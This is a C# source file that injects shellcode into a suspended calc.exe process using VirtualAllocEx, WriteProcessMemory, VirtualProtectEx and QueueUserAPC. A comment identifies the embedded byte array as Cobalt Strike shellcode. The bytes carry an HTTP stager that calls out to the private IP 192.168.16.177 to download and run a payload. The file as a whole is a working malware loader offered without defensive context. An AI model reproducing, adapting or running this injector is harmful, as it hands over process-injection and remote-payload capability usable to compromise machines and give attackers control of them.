using System;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.IO;
using System.Threading;



public class Program
{
    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO
    {
        public int cb;
        public IntPtr lpReserved;
        public IntPtr lpDesktop;
        public IntPtr lpTitle;
        public int dwX;
        public int dwY;
        public int dwXSize;
        public int dwYSize;
        public int dwXCountChars;
        public int dwYCountChars;
        public int dwFillAttribute;
        public int dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            public bool bInheritHandle;
        }

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern bool CreateProcessW(
            string lpApplicationName,
            string lpCommandLine,
            ref SECURITY_ATTRIBUTES lpProcessAttributes,
            ref SECURITY_ATTRIBUTES lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAllocEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            uint dwSize,
            AllocationType flAllocationType,
            MemoryProtection flProtect);

        [DllImport("kernel32.dll")]
        public static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            int nSize,
            out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        public static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            uint dwSize,
            MemoryProtection flNewProtect,
            out MemoryProtection lpflOldProtect);

        [DllImport("kernel32.dll")]
        public static extern uint QueueUserAPC(
            IntPtr pfnAPC,
            IntPtr hThread,
            uint dwData);


        [DllImport("kernel32.dll")]
        public static extern uint ResumeThread(
            IntPtr hThread);

        [Flags]
        public enum AllocationType
        {
            Commit = 0x1000,
            Reserve = 0x2000,
            Decommit = 0x4000,
            Release = 0x8000,
            Reset = 0x80000,
            Physical = 0x400000,
            TopDown = 0x100000,
            WriteWatch = 0x200000,
            LargePages = 0x20000000
        }

        [Flags]
        public enum MemoryProtection
        {
            Execute = 0x10,
            ExecuteRead = 0x20,
            ExecuteReadWrite = 0x40,
            ExecuteWriteCopy = 0x80,
            NoAccess = 0x01,
            ReadOnly = 0x02,
            ReadWrite = 0x04,
            WriteCopy = 0x08,
            GuardModifierflag = 0x100,
            NoCacheModifierflag = 0x200,
            WriteCombineModifierflag = 0x400
        }
        public Program()
        {
            var si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(si);

            var pa = new SECURITY_ATTRIBUTES();
            pa.nLength = Marshal.SizeOf(pa);

            var ta = new SECURITY_ATTRIBUTES();
            ta.nLength = Marshal.SizeOf(ta);

            var pi = new PROCESS_INFORMATION();
            
      
            var success = CreateProcessW(
                "C:\\Windows\\System32\\calc.exe",
                null,
                ref ta,
                ref pa,
                false,
                0x00000004, 
                IntPtr.Zero,
                "C:\\Windows\\System32",
                ref si,
                out pi);
   
            
            byte[] shellcode;

            //example shellcode from Cobalt Strike
            shellcode = new byte[893] { 0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc8, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x66, 0x81, 0x78, 0x18, 0x0b, 0x02, 0x75, 0x72, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x4f, 0xff, 0xff, 0xff, 0x5d, 0x6a, 0x00, 0x49, 0xbe, 0x77, 0x69, 0x6e, 0x69, 0x6e, 0x65, 0x74, 0x00, 0x41, 0x56, 0x49, 0x89, 0xe6, 0x4c, 0x89, 0xf1, 0x41, 0xba, 0x4c, 0x77, 0x26, 0x07, 0xff, 0xd5, 0x48, 0x31, 0xc9, 0x48, 0x31, 0xd2, 0x4d, 0x31, 0xc0, 0x4d, 0x31, 0xc9, 0x41, 0x50, 0x41, 0x50, 0x41, 0xba, 0x3a, 0x56, 0x79, 0xa7, 0xff, 0xd5, 0xeb, 0x73, 0x5a, 0x48, 0x89, 0xc1, 0x41, 0xb8, 0x50, 0x00, 0x00, 0x00, 0x4d, 0x31, 0xc9, 0x41, 0x51, 0x41, 0x51, 0x6a, 0x03, 0x41, 0x51, 0x41, 0xba, 0x57, 0x89, 0x9f, 0xc6, 0xff, 0xd5, 0xeb, 0x59, 0x5b, 0x48, 0x89, 0xc1, 0x48, 0x31, 0xd2, 0x49, 0x89, 0xd8, 0x4d, 0x31, 0xc9, 0x52, 0x68, 0x00, 0x02, 0x40, 0x84, 0x52, 0x52, 0x41, 0xba, 0xeb, 0x55, 0x2e, 0x3b, 0xff, 0xd5, 0x48, 0x89, 0xc6, 0x48, 0x83, 0xc3, 0x50, 0x6a, 0x0a, 0x5f, 0x48, 0x89, 0xf1, 0x48, 0x89, 0xda, 0x49, 0xc7, 0xc0, 0xff, 0xff, 0xff, 0xff, 0x4d, 0x31, 0xc9, 0x52, 0x52, 0x41, 0xba, 0x2d, 0x06, 0x18, 0x7b, 0xff, 0xd5, 0x85, 0xc0, 0x0f, 0x85, 0x9d, 0x01, 0x00, 0x00, 0x48, 0xff, 0xcf, 0x0f, 0x84, 0x8c, 0x01, 0x00, 0x00, 0xeb, 0xd3, 0xe9, 0xe4, 0x01, 0x00, 0x00, 0xe8, 0xa2, 0xff, 0xff, 0xff, 0x2f, 0x77, 0x56, 0x44, 0x4c, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0x73, 0x65, 0x72, 0x2d, 0x41, 0x67, 0x65, 0x6e, 0x74, 0x3a, 0x20, 0x4d, 0x6f, 0x7a, 0x69, 0x6c, 0x6c, 0x61, 0x2f, 0x34, 0x2e, 0x30, 0x20, 0x28, 0x63, 0x6f, 0x6d, 0x70, 0x61, 0x74, 0x69, 0x62, 0x6c, 0x65, 0x3b, 0x20, 0x4d, 0x53, 0x49, 0x45, 0x20, 0x37, 0x2e, 0x30, 0x3b, 0x20, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73, 0x20, 0x4e, 0x54, 0x20, 0x35, 0x2e, 0x31, 0x3b, 0x20, 0x53, 0x56, 0x31, 0x3b, 0x20, 0x2e, 0x4e, 0x45, 0x54, 0x20, 0x43, 0x4c, 0x52, 0x20, 0x32, 0x2e, 0x30, 0x2e, 0x35, 0x30, 0x37, 0x32, 0x37, 0x29, 0x0d, 0x0a, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x41, 0xbe, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5, 0x48, 0x31, 0xc9, 0xba, 0x00, 0x00, 0x40, 0x00, 0x41, 0xb8, 0x00, 0x10, 0x00, 0x00, 0x41, 0xb9, 0x40, 0x00, 0x00, 0x00, 0x41, 0xba, 0x58, 0xa4, 0x53, 0xe5, 0xff, 0xd5, 0x48, 0x93, 0x53, 0x53, 0x48, 0x89, 0xe7, 0x48, 0x89, 0xf1, 0x48, 0x89, 0xda, 0x41, 0xb8, 0x00, 0x20, 0x00, 0x00, 0x49, 0x89, 0xf9, 0x41, 0xba, 0x12, 0x96, 0x89, 0xe2, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x20, 0x85, 0xc0, 0x74, 0xb6, 0x66, 0x8b, 0x07, 0x48, 0x01, 0xc3, 0x85, 0xc0, 0x75, 0xd7, 0x58, 0x58, 0x58, 0x48, 0x05, 0x00, 0x00, 0x00, 0x00, 0x50, 0xc3, 0xe8, 0x9f, 0xfd, 0xff, 0xff, 0x31, 0x39, 0x32, 0x2e, 0x31, 0x36, 0x38, 0x2e, 0x31, 0x36, 0x2e, 0x31, 0x37, 0x37, 0x00, 0x00, 0x00, 0x00, 0x00 };


            
            var baseAddress = VirtualAllocEx(
                pi.hProcess,
                IntPtr.Zero,
                (uint)shellcode.Length,
                AllocationType.Commit | AllocationType.Reserve,
                MemoryProtection.ReadWrite);

            
            IntPtr bytesWriten;
            WriteProcessMemory(
                pi.hProcess,
                baseAddress,
                shellcode,
                shellcode.Length,
                out bytesWriten);

            
            MemoryProtection lpflOldProtect;
            VirtualProtectEx(
                pi.hProcess,
                baseAddress,
                (uint)shellcode.Length,
                MemoryProtection.ExecuteRead,
                out lpflOldProtect);

            
            QueueUserAPC(
                baseAddress, // point to the shellcode location
                pi.hThread,  // primary thread of process
                0);
            
            
            ResumeThread(pi.hThread);

        }

}
